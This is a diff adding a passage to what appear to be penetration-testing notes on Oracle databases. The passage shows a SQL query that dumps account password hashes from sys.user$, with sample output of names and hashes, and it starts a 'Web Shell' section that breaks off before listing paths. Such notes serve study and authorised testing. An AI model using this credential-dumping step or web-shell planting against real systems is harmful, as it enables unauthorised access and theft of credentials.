@@ -176,3 +176,31 @@ SQL>
 - From this point on, you can retrieve passwords from `sys.user$`
 
 #### Extracting Password hashes
+```bash
+SQL> select name, password from sys.user$;
+
+NAME                           PASSWORD
+------------------------------ ------------------------------
+SYS                            FBA343E7D6C8BC9D
+PUBLIC
+CONNECT
+RESOURCE
+DBA
+SYSTEM                         B5073FE1DE351687
+SELECT_CATALOG_ROLE
+EXECUTE_CATALOG_ROLE
+DELETE_CATALOG_ROLE
+OUTLN                          4A3BA55E08595C81
+EXP_FULL_DATABASE
+
+NAME                           PASSWORD
+------------------------------ ------------------------------
+IMP_FULL_DATABASE
+LOGSTDBY_ADMINISTRATOR
+<SNIP>
+```
+
+### Web Shell
+- Web shells can be used if there is a web server being ran
+- Depending on the OS you can try these paths:
+  
